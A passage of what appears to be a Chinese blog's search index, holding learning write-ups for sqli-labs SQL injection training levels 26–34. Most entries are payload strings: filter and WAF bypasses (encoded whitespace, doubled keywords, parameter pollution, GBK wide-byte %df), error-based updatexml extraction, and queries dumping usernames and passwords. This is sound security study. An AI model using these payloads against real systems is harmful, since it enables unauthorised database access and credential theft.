class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out --</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out #</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out slashes</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
我们可以看到，这一次，不仅仅是or与and，还多过滤了好几种情况<br>我们只需要绕过即可，对于空格有几种方式：</li>
</ol>
<ul>
<li>编码绕过<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%09 TAB键（空格）  %0A 新建一行（空格）</span><br><span class="line">%0C 新的一页       %0D return即回车功能（php-5.2.17,5.3.29成功）</span><br><span class="line">%0B TAB键（垂直）  %A0 空格（php-5.2.17成功）</span><br></pre></td></tr></table></figure></li>
<li>括号绕过<br>用()绕过，不使用任何空格</li>
<li>以上方法不一定都对自己的配置有效，需要尝试</li>
</ul>
<h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><p>这里使用()的方式绕过空格</p>
<ol start="2">
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(version())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;)),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#x27;users&#x27;)),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;||updatexml(1,concat(&#x27;~&#x27;,(select(concat(&#x27;~&#x27;,id,&#x27;~&#x27;,username,&#x27;~&#x27;,passwoorrd))from(users)limit%0b0,1)),0)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><p>这里使用%0b的方式绕过空格，%26%26绕过and</p>
<ol start="2">
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;%0bunion%0bselect%0b1,database(),3%26%26&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=&#x27;%0bunion%0bselect%0b1,version(),3%26%26&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;union%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=&#x27;security&#x27;%26%26%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=&#x27;union%0bselect%0b1,group_concat(column_name),3%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=&#x27;security&#x27;%0baandnd%0btable_name=&#x27;users&#x27;%26%26%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;union%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第26a关"><a href="#第26a关" class="headerlink" title="第26a关"></a>第26a关</h2><p>与26关相比，只是闭合方式变更为’)</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>使用url编码后，逐渐让语句变得不那么好读了…</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_46315342/article/details/106557886">Sqli-labs之Less-26和Less-26a</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_27+27a</title>
    <url>/2022/11/17/sqli-labs_27+27a/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>相比之前并没有大的变化，照猫画虎罢了</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>本关通过查看源码可知，select和union被过滤了，但and和or这次没被过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>问题不大，可以通过大小写或重写绕过</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(version())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;security&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;users&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(concat(username,&#x27;:&#x27;,password))from(users)limit%0b0,1)),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第27a关"><a href="#第27a关" class="headerlink" title="第27a关"></a>第27a关</h2><p>与27关相比，只是闭合方式变更为”</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>a piece of cake~</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_28</title>
    <url>/2022/11/17/sqli-labs_28+28a/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>绕过该绕过的，注入照常注入</p>
<span id="more"></span>

<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
<li>测试并判断注入类型<br>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);					<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
绕过union和select，选择重写或加字符绕过<br>末尾选择字符串截断%00<br>或<code>%0aand(&#39;1</code></li>
</ol>
<h1 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h1><ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)%0Aorder%0Aby%0A4%0Aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,3%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,database(),3%0aand(&#x27;1</span><br><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,version(),3%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#x27;security&#x27;%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=&#x27;users&#x27;%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;)%0buniOn%0bsElEct%0b1,(group_concat(username,0x7e,password)),3%0bfrom%0busers%0bwhere%0b(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第28a关"><a href="#第28a关" class="headerlink" title="第28a关"></a>第28a关</h2><p>与28关相比，只是过滤条件少了几个</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>构造语句的原理还不甚明白，有些人写的博客能过，有些不能过。<br>总的来说，用%00是比较通用简单的方式</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/weixin_39934520/article/details/105801767">Sqli-labs之Less-28和Less-28a</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_29-31</title>
    <url>/2022/11/17/sqli-labs_29-31/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关又出了个新花样</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>先进行常规操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 4 --+  出现报错</span><br><span class="line">?id=-1&#x27;union select 1,2,3 --+  爆出显示位</span><br></pre></td></tr></table></figure>
<p>但当我们进入login.php页面，再继续注入时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login.php?id=1&#x27; --+</span><br></pre></td></tr></table></figure>
<p>页面跳转<br><img src="/simg/sqli-labs_29.png" alt="显示"><br>这里是部署了WAF<br>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。<br>详细解释：<a href="https://baike.baidu.com/item/WAF/3239498">WAF</a><br>第一个参数被WAF所检查，但第二个参数不会，因此我们可以加入第二个参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=2</span><br></pre></td></tr></table></figure>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=2&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),3 from users --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第30关"><a href="#第30关" class="headerlink" title="第30关"></a>第30关</h2><p>与第29关差不多，只是闭合方式从’变更为”</p>
<h2 id="第31关"><a href="#第31关" class="headerlink" title="第31关"></a>第31关</h2><p>与第29关差不多，只是闭合方式从”变更为”)</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>主要是，知道怎么做，注入方式就那几样，常规注入，报错注入，布尔盲注，时间盲注，抓包注入…</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_3</title>
    <url>/2022/11/08/sqli-labs_3/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有了过第1，2关的基础，现在再往后看就比较轻松了。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_3.png" alt="报错信息"></p>
</li>
<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘’1’’) LIMIT 0,1’ at line 1<br>可知，sql语句是单引号字符型且有括号。<br>所以我们也需要闭合单引号和括号。<br>则构造语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&#x27;)--+</span><br></pre></td></tr></table></figure></li>
</ol>
<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
<ol start="3">
<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;) order by 3--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
<li>此笔记为笔者初学sql注入时所写</li>
<li>本关重点在于通过报错信息判断sql语句</li>
</ul>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_32+33</title>
    <url>/2022/11/18/sqli-labs_32+33/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关涉及到了编码格式</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试并判断注入类型<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;  发现被转义为了 1\&#x27;</span><br></pre></td></tr></table></figure>
查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
复习一下，<br>preg_replace()函数执行一个正则表达式的搜索和替换。详细：<a href="https://www.runoob.com/php/php-preg_replace.html">PHP preg_replace() 函数</a><br>preg_quote()函数用于转义正则表达式字符。详细：<a href="https://www.runoob.com/php/php-preg_quote.html">PHP preg_quote() 函数</a><br>因此，我们无法用单引号双引号闭合注入<br>但源码中还有一句引起了注意：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_query(&quot;SET NAMES gbk&quot;);</span><br></pre></td></tr></table></figure>
这里表明是使用gbk编码，那么我们可以尝试使用宽字节注入。</li>
</ol>
<ul>
<li>当某字符的大小为一个字节时，称其字符为窄字节.</li>
<li>当某字符的大小为两个字节时，称其字符为宽字节.</li>
<li>所有英文默认占一个字节，汉字占两个字节</li>
<li>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等<br>宽字节的格式是在地址后先加一个%df，再加单引号，因为反斜杠的编码为%5c，而在GBK编码中，%df%5c是繁体字“連”，所以这时，单引号成功逃逸。<br>宽字节注入情况：</li>
<li>客户端、连接层、结果集 都是GBK编码</li>
<li>使用iconv进行字符集转换，将UTF-8转为GBK，同时，set names字符集为GBK。提交%e9%8c%a6即可。</li>
<li>使用set names UTF-8指定了UTF-8字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的GBK字符使用iconv函数（或者mb_convert_encoding）先转为UTF-8，然后再拼接入SQL语句。</li>
</ul>
<p>注意：<br>页面默认是utf-8，如果想看显示效果需要更改页面编码，我这里是用到了chrome的扩展商店的插件，具体可看下面这篇文章<br><a href="https://www.munue.com/172.html#:~:text=%E5%8F%B3%E9%94%AE%E7%82%B9%E5%87%BB%E5%9B%BE%E6%A0%87%EF%BC%8C%E6%89%93%E5%BC%80%E9%80%89%E9%A1%B9,%E8%BF%9B%E8%A1%8C%E9%80%89%E6%8B%A9%E5%92%8C%E8%AE%BE%E7%BD%AE%E7%BC%96%E7%A0%81%E3%80%82">Google Chrome 浏览器如何设置网页编码</a></p>
<p>最终，我们构造该语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure>
<p>页面显示效果如下<br><img src="/simg/sqli-labs_32.png" alt="显示效果"></p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27;order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(0x7e,id,0x7e,username,0x7e,password) from users) --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第33关"><a href="#第33关" class="headerlink" title="第33关"></a>第33关</h2><p>和第32关本质是一样的，只是源码用了addslashes()函数<br>addslashes()函数：addslashes() 函数返回在预定义的字符前添加反斜杠的字符串<br>预定义字符是：</p>
<ul>
<li>单引号（’）</li>
<li>双引号（”）</li>
<li>反斜杠（\）</li>
<li>NULL<br>注入方式相同，这里不再重复</li>
</ul>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>学到了宽字节注入</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a><br><a href="https://blog.csdn.net/m0_62879498/article/details/122558222">sql-lab (32~35)包含对 宽字节注入的原理理解及注意事项</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_34</title>
    <url>/2022/11/18/sqli-labs_34/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>gogogo</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>有两种方案：</p>
